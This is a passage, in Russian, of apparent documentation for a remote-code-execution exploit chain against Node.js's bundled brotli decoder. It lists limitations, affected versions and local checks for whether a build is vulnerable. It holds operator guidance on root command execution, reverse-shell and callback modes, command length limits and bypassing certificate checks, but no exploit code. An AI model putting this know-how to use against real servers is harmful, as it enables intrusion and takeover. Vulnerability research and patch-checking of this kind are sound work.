  чтения всегда совпадает с окном последней записи. Произвольного чтения из
  этого не выходит.
* **Адаптивный паддинг.** На Node 16 KiB выходного буфера оставляют 17464
  литерала, остаток 20536 бит равен 2567 байтам. В C-харнессе с 64 KiB
  буфером было 37000 литералов и 125 байт. Паддинг считается из
  наблюдаемого среза, а не задаётся константой.
* **Hold-open.** После `J=63` `ringbuffer` указывает внутрь `state`, а в
  лике на адрес чтения (`execvp@GOT` в `--got`, ELF/данные в runtime).
  `BrotliDecoderStateCleanup` сделал бы `free()`
  по не-heap указателю и уронил процесс. `system()` исполняется до teardown,
  поэтому команда успевает выполниться; в режиме `-C` канал нельзя закрывать
  до получения вывода.

## 10. Ограничения

* linux x86_64 и linux/arm64. arm64 проверен под qemu-user: полная цепочка
  без констант, `uid=0(root)`, `aarch64`, 1278 чтений, 1040 с; нативного
  железа не было. На qemu нужны 4 worker по умолчанию: 8 могут неверно
  прочитать преамбулу.
* 26.12.0 и 25.9.0 используют LIVE-кодоген; на 25.9.0 цепочка проверена,
  `uid=0(root)`, патченного 25.x нет. На 22.23.3/24.22.0 измерены heap-leak
  через ringbuffer wrap и rb-относительный write, но RCE нет: линейный
  tail-loop и разница арен. Патчи 22.23.4/24.22.1 дают `-17` и живы.
* По умолчанию база libc и `system` резолвятся в рантайме, без GOT-констант
  и смещений libc. Non-PIE: ELF по `0x400000`, `PT_DYNAMIC`, `DT_DEBUG`,
  `link_map`, GNU hash. PIE: `context_lookup` из среза, скан вниз до
  ELF-заголовка libbrotlicommon (ET_DYN; фиксированного смещения таблицы
  нет), dynamic/GOT, libc base сканом, GNU hash. `--got` остаётся явным
  fallback для проверенной сборки; для другой сборки нужен свой `--got` и `-l`.
* HTTPS: TLS включён для адреса цели, проверка сертификата по умолчанию
  строгая, для самоподписанного нужен `-k`. Runtime-резолвер без констант
  проверен поверх HTTPS через TLS-терминатор (`lab/tls-tunnel.js`):
  `https://…:19816/` + `-k`, полный прогон 1/1, `uid=0(root)`, 1255
  чтений, резолвер 222-227 с, 8 потоков, 0 транспортных ретраев;
  отрицательный контроль через терминатор к 26.12.1 даёт `-17`, процесс
  жив. Python SIGSEGV на длинных TLS-сериях был гонкой
  `SSL_read`/`SSL_write` на одном `SSLSocket`: каналы теперь держат один
  лок на все операции и стартуют читателя после записи (400/400 чтений на
  8 потоках, 3 полных прогона). Вариант с TLS внутри приложения
  (`lab/https-sink.js`) после перекалибровки фазы тоже работает: 16-КБ
  границы TLSWrap безопасны (`GetAvailIn == 0` на всех 1664 границах,
  tail-copy в `state+168`), а падения были из-за разбора decoder-struct в
  продолжении и OOB `htrees[]` при повреждённой карте distance-контекстов.
  Фаза теперь несёт 256 одинаковых distance-деревьев, `t[0]=0x04`: прямой
  `https://…:19812/` + `-k` даёт 1/1 полный прогон, `uid=0(root)`, 1255
  чтений, резолвер 239 с, 0 падений цели; отрицательный контроль 26.12.1
  (`https://…:19813/`), 4 байта и `-17`, процесс жив. Терминатор остаётся
  равнозначным вариантом. Механизм: `evidence/runtime-both.md` §5.
  Callback и URL для `fetch()` остаются HTTP.
* Runtime в response-векторе требует явного декодера на стороне цели
  (`zlib.createBrotliDecompress`). Авто-декодер undici
  (`flush: BROTLI_OPERATION_FLUSH`) ломает tail-copy: процесс цели падает
  SIGSEGV примерно на 25-50% чтений. Это ограничение примитива, а не
  `system()`; request-вектор стабилен.
* Команда идёт через `system()` и `sh -c`. Геометрия записи допускает до 280
  байт, но практически предел 226: с 227 байт включается длинная
  insert-ветка (structure 14, insert code 18), которая роняет цель SIGSEGV
  без выполнения (свежий 26.12.0: `n≈182`, `uid=0(root)`; `n=259`, exit
  139). Инструмент отклоняет `n >= 227`; длинную команду запускайте коротким
  бутстрапом. Проверены `n=13`, `n=37`, `n=58`, `n=62` и `n=100`.
* Цель должна декодировать `br` в теле запроса потоково, отдавая выход
  декодера (вектор a), или сама вызывать `fetch()` по URL атакующего
  (вектор b). Голый `node:http` без декодирования не уязвим через вектор (a);
  буферизующий body-parser не отдаёт выход декодера до конца запроса и для
  этой цепочки не подходит.
* После команды декодер остаётся испорченным. Request vector: 50/50 на
  свежих процессах и 5/5 при повторной эксплуатации в одном процессе.
* Режим `--callback` требует callback-сервера оператора и сетевого доступа
  от цели. Целевой эндпоинт чтения файлов не используется.
* Blind по умолчанию не даёт подтверждения в самом канале. Успех проверяется
  только по эффекту команды на цели.
* Reverse shell требует TCP-listener оператора и доступ от цели. Сессия
  живёт, пока `system()` не вернётся, то есть до закрытия шелла оператором.
* В векторе (b) процесс цели может упасть на teardown после возврата
  `system()`; команда к этому моменту уже выполнена.
* Отдельной уязвимости здесь нет. Все примитивы являются следствиями одной
  ошибки CVE-2026-111497 и блокируются патчем `-17`. Если D2 можно
  сработать независимо от этой ошибки, это нужно доказывать на 26.12.1
  отдельно.

## 11. Затронутость

Официальные сборки Node несут собственную копию brotli, поэтому фикс
приходит с версией Node. Дистрибутивные пакеты могут линковаться с системной
библиотекой. Ubuntu помечает `nodejs` на jammy+ как not affected, потому что
он использует системный brotli, а focal помечен как vulnerable из-за
vendored-копии. Debian 12 LTS получил `brotli 1.0.9-2+deb12u1` в DLA-4855-1.

Проверки на месте:

```bash
node -p "process.versions.brotli"
node -p "require('zlib').constants.BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH"
ldd "$(command -v node)" | grep brotli
```

Отсутствие константы означает уязвимую сборку. Наличие `libbrotlidec` в
`ldd` означает, что фикс может прийти через пакет `brotli`, а не через
версию Node.

Electron 45.0.0 от 2026-10-21 собран с Node 24.22.0 и попадает в затронутый
диапазон. Electron 45.1.0 собран с Node 24.22.1. Наш путь на 24.22.0 x86_64
не работает, поэтому RCE на Electron 45.0.0 не заявляется. Затронутость
определяется версией Node внутри Electron, а не версией Electron.

## 13. Чего здесь нет

Здесь нет отдельной уязвимости, нет обхода патча и нет утверждения о
стабильности на произвольной сборке. Нативного arm64 не было, под qemu-user цепочка
проверена. Нет требования к целевому
эндпоинту чтения файлов: в режиме `-C` вывод забирает callback-сервер
оператора, blind вывода не собирает, reverse shell использует TCP-listener.
Blind не отменяет требование к декодированному потоку первого запроса: без
него нет среза состояния и цепочка не работает ни в одном режиме. Примитивы
(самолик `symbol_lists`, литеральная запись за `rbsz`, `J=63` и тройка
METADATA) это следствия одной и той же CVE-2026-111497, патч `-17` закрывает
их все.
